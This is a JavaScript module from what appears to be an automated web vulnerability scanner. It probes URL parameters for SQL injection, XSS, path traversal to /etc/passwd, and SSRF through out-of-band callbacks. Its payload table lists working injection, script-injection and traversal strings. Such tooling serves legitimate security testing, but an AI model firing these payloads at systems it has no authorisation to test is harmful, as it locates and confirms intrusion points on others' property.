'use strict';
/**
 * Active prober — the observer that closes the loop.
 *
 * PageBreak's insight: the agent proposes a hypothesis, then a validator
 * "executes a real payload to confirm the exploit". This module is that
 * execution layer for web targets. It runs the mutation set that
 * `predict.mutationPlan()` chose for each parameter, captures a *baseline in
 * the same run* so differentials are meaningful, and emits evidence in exactly
 * the shape `validators.judge()` consumes.
 *
 * Speed is a design constraint, not an afterthought:
 *   - parameters are probed concurrently, bounded by a concurrency cap
 *   - a parameter that yields a differential is not probed again
 *   - time-based payloads run only after cheap checks fail, never speculatively
 *   - one connection-reusing request context for the whole target
 */

const { mutationPlan, predict } = require('./predict');
const { makeLead } = require('./leads');
const oob = require('./oob');
const V = require('./validators');

/** Cheap, non-destructive payloads. Nothing here writes, deletes, or pays. */
const PAYLOADS = {
  injection: [
    { id: 'quote', value: "'", kind: 'error' },
    { id: 'bool-true', value: "' AND '1'='1", kind: 'boolean', expect: 'more' },
    { id: 'bool-false', value: "' AND '1'='0", kind: 'boolean', expect: 'same' },
    { id: 'numeric-bool-true', value: '1 AND 1=1', kind: 'boolean', expect: 'more' },
    { id: 'numeric-bool-false', value: '1 AND 1=0', kind: 'boolean', expect: 'same' },
    { id: 'time', value: "1' AND SLEEP(3)--", kind: 'time' },
  ],
  xss: [
    { id: 'script', value: '<script>window.__ph=1</script>', kind: 'xss' },
    { id: 'img', value: '<img src=x onerror=window.__ph=1>', kind: 'xss' },
    { id: 'attr-break', value: '"><svg onload=window.__ph=1>', kind: 'xss' },
  ],
  traversal: [
    { id: 'relative', value: '../../../../../../etc/passwd', kind: 'traversal' },
    { id: 'absolute', value: '/etc/passwd', kind: 'traversal' },
    { id: 'nullbyte', value: '../../../../etc/passwd\x00.jpg', kind: 'traversal' },
  ],
  ssrf: [],     // requires an OOB URL; handled separately
  authz: [],    // requires a second identity; handled by authmatrix
  business: [
    { id: 'negative', value: '-1', kind: 'business' },
    { id: 'huge', value: '999999999', kind: 'business' },
    { id: 'zero', value: '0', kind: 'business' },
  ],
  authn: [{ id: 'empty', value: '', kind: 'authn' }],
  config: [],
};

/** Map a predicted class to the payload set(s) worth running. */
function payloadPlan(classes) {
  const plan = [];
  for (const c of classes || []) {
    for (const p of PAYLOADS[c] || []) plan.push({ ...p, cls: c });
  }
  return plan;
}

/** Concurrent map with a hard cap; never rejects, never hangs. */
async function pmap(items, cap, fn) {
  const out = new Array(items.length);
  let i = 0;
  const workers = Array.from({ length: Math.max(1, Math.min(cap, items.length)) }, async () => {
    for (;;) {
      const idx = i++;
      if (idx >= items.length) return;
      try { out[idx] = await fn(items[idx], idx); } catch (e) { out[idx] = { error: String(e && e.message || e) }; }
    }
  });
  await Promise.all(workers);
  return out;
}

/**
 * Probe one parameter.
 * @param ctx.request Playwright APIRequestContext (connection reuse)
 * @returns evidence object shaped for validators.judge()
 */
async function probeParam(ctx, endpoint) {
  const { url, param, value = '', classes = [] } = endpoint;
  const plan = payloadPlan(classes);
  if (!plan.length) return { param, url, skipped: 'no payload set for predicted classes' };

  const build = (v) => {
    const u = new URL(url);
    u.searchParams.set(param, v);
    return u.toString();
  };

  // Baseline first, in the same run. Without this every differential is a guess.
  const base = await timed(ctx, build(value));

  const ev = { url, param, baseline: base, classes };
  const attempts = [];
  let differential = null;

  for (const p of plan) {
    if (differential) break;   // early exit: we already have a signal
    const r = await timed(ctx, build(p.value));
    attempts.push({ id: p.id, kind: p.kind, status: r.status, ms: r.ms, len: r.length });

    if (p.kind === 'error') {
      ev.errorBody = r.body;
      ev.errorIsEcho = r.body === base.body;
      if (V.L2.dbError(r.body).pass) { differential = p; break; }
    } else if (p.kind === 'boolean') {
      if (p.expect === 'more') ev.booleanTrue = { length: r.length, status: r.status };
      else ev.booleanFalse = { length: r.length, status: r.status };
      if (ev.booleanTrue && ev.booleanFalse) { differential = differential || p; }
    } else if (p.kind === 'time') {
      // Only reached after the cheap checks; never speculative.
      ev.timing = { baseline: base.ms, injected: r.ms };
      if (r.ms - base.ms > 1500) { differential = p; break; }
    } else if (p.kind === 'xss') {
      // Reflection alone is not proof. The browser oracle must confirm execution.
      if (r.body && r.body !== base.body) ev.reflected = true;
    } else if (p.kind === 'traversal') {
      if (/root:|\/bin\/bash|www-data/.test(r.body || '')) { ev.body = r.body; differential = p; break; }
    }
  }

  ev.attempts = attempts;
  return ev;
}

async function timed(ctx, url) {
  const t0 = Date.now();
  try {
    const res = await ctx.request.get(url, { timeout: 12000, failOnStatusCode: false, maxRedirects: 2 });
    const body = await res.text().catch(() => '');
    return { status: res.status(), ms: Date.now() - t0, length: body.length, body: body.slice(0, 20000) };
  } catch (e) {
    return { status: 0, ms: Date.now() - t0, length: 0, body: '', error: String(e.message || e) };
  }
}

/**
 * SSRF / blind probing: inject a unique OOB URL per parameter, wait, then read
 * the interaction stream. Each parameter gets its own server-issued hostname so
 * a callback is attributed to the exact injection point.
 *
 * Falls back to the infrastructure-free timing oracle when interactsh cannot
 * issue a payload (public instances are sometimes rate-limited).
 */
async function probeSSRF(ctx, endpoints, opts = {}) {
  const results = [];
  const client = new oob.OOBClient({ server: opts.oobServer, bin: opts.oobBin });

  if (opts.oobOff || !client.available) {
    // No callback infrastructure: use the metadata-vs-documentation timing gap,
    // which needs nothing but outbound connectivity from the target.
    const notes = [];
    for (const ep of endpoints.slice(0, 4)) {
      const t = await oob.timingOracle(
        async (u, budget) => { await ctx.request.get(ep.urlWith ? ep.urlWith(u) : u, { timeout: Math.min(budget || 3000, 4000) }).catch(() => null); },
        { samples: opts.timingSamples || 4, budgetMs: 3500 },
      );
      results.push({ ...ep, grade: t.proven
        ? { verdict: 'proven', severity: 'high', confidence: t.confidence, why: t.why }
        : { verdict: 'refuted', severity: 'low', confidence: t.confidence, why: t.why } });
      notes.push(`${ep.param}: ${t.why}`);
    }
    return { results, interactions: [], usedTimingOracle: true, notes };
  }

  try {
    const specs = await client.urlsFor(endpoints.map((e) => e.param || 'ssrf'));
    for (let i = 0; i < endpoints.length; i++) {
      const ep = endpoints[i];
      const spec = specs[i];
      const u = new URL(ep.url);
      u.searchParams.set(ep.param, spec.url);
      try { await ctx.request.get(u.toString(), { timeout: 12000 }); } catch { /* target may be slow */ }
      results.push({ ...ep, oobUrl: spec.url, token: spec.token, host: spec.host });
    }
    // Callbacks are frequently delayed (background workers, DNS retry).
    const interactions = opts.pollMs ? await client.poll(opts.pollMs) : [];
    for (const r of results) {
      const mine = client.forToken(r.token);
      r.grade = oob.grade(mine);
    }
    return { results, interactions, usedTimingOracle: false };
  } catch (e) {
    return { results: [], interactions: [], error: String(e.message || e).slice(0, 160) };
  } finally {
    client.stop();
  }
}

function hostOf(s) { try { return new URL(s).hostname; } catch { return s; } }

/**
 * Full probe run over a knowledge base's known endpoints.
 * Concurrency-bounded, connection-reused, and early-exiting per parameter.
 */
async function probeAll(ctx, kb, opts = {}) {
  const cap = opts.concurrency || 6;
  const maxEndpoints = opts.maxEndpoints || 25;
  const notes = [];

  // Prioritise: authorization-shaped parameters first (highest yield).
  const targets = [];
  for (const [url, e] of kb.endpoints) {
    for (const p of e.params || []) {
      const pred = predict(p);
      // An authorization prediction does not exclude injection. `id` is the
      // highest-yield authz parameter *and* a frequent SQLi sink; testing it
      // only for cross-identity access would miss the injection behind it, so
      // authz-shaped params also get the cheap non-destructive injection pass.
      const classes = pred.classes.includes('authz') && !pred.classes.includes('injection')
        ? [...pred.classes, 'injection']
        : pred.classes;
      targets.push({ url, param: p, value: '', classes, score: pred.score });
    }
    if (targets.length >= maxEndpoints * 3) break;
  }
  targets.sort((a, b) => b.score - a.score);
  const selected = targets.slice(0, maxEndpoints);

  if (!selected.length) {
    return { evidence: [], leads: [], notes: ['no parameters known — run recon or ingest a crawl first'] };
  }

  const ssrfTargets = selected.filter((t) => t.classes.includes('ssrf'));
  const nonSsrf = selected.filter((t) => !t.classes.includes('ssrf'));

  const evs = await pmap(nonSsrf, cap, (t) => probeParam(ctx, t));

  // SSRF separately: it needs an OOB round trip, not a differential.
  let ssrfOut = { results: [] };
  if (ssrfTargets.length) {
    ssrfOut = await probeSSRF(ctx, ssrfTargets.slice(0, 8), { oobServer: opts.oobServer, oobBin: opts.oobBin, pollMs: opts.oobPollMs == null ? 12000 : opts.oobPollMs, oobOff: opts.oobOff, timingSamples: opts.timingSamples });
    notes.push(`ssrf: ${ssrfTargets.length} URL-shaped parameter(s) probed via ${ssrfOut.usedTimingOracle ? 'the no-infrastructure timing oracle' : 'OOB callbacks'}${ssrfOut.error ? ' (' + ssrfOut.error + ')' : ''}`);
  }

  // Judge everything through the deterministic validators + adversary.
  const evidence = [];
  const leads = [];
  for (const ev of evs) {
    if (!ev || ev.skipped || ev.error) continue;
    // Pick the class we actually gathered evidence for. A parameter predicted
    // for authz may carry an injection differential, and authz validation needs
    // a second identity we do not have here — so select by evidence, not by
    // prediction order, or a real SQLi would be scored as an unproven authz lead.
    const cls = ev.timing || ev.booleanTrue || ev.errorBody !== undefined ? 'injection'
      : ev.reflected ? 'xss'
      : ev.body && /root:|www-data/.test(ev.body) ? 'traversal'
      : (ev.classes || [])[0] || 'config';
    const verdict = V.judge(cls, ev);
    evidence.push({ param: ev.param, url: ev.url, cls, verdict: verdict.verdict, ship: verdict.ship, confidence: verdict.confidence, why: verdict.why, refutation: verdict.refutation, attempts: ev.attempts });
    if (verdict.ship) {
      leads.push(makeLead({
        cls,
        title: `PROVEN ${cls.toUpperCase()} in '${ev.param}'`,
        url: ev.url,
        param: ev.param,
        source: 'prober',
        severity_hint: 'high',
        confidence: 'confirmed',
        evidence: verdict.why,
        proof_needed: V.L3.questions(ev),
      }));
    }
  }
  for (const r of ssrfOut.results) {
    const g = r.grade || { verdict: 'none' };
    evidence.push({ param: r.param, url: r.url, cls: 'ssrf', verdict: g.verdict, ship: g.verdict === 'proven', confidence: g.confidence || 0, why: g.why || 'no callback' });
    if (g.verdict === 'proven') {
      leads.push(makeLead({
        cls: 'ssrf',
        title: `PROVEN SSRF via '${r.param}'`,
        url: r.url, param: r.param, source: 'prober', severity_hint: g.severity === 'critical' ? 'critical' : 'high', confidence: 'confirmed',
        evidence: g.why, proof_needed: ['confirm the origin server issued the request', 'determine whether responses are readable (non-blind)'],
      }));
    }
  }
  return { evidence, leads, notes };
}

module.exports = { probeAll, probeParam, probeSSRF, payloadPlan, pmap, PAYLOADS };
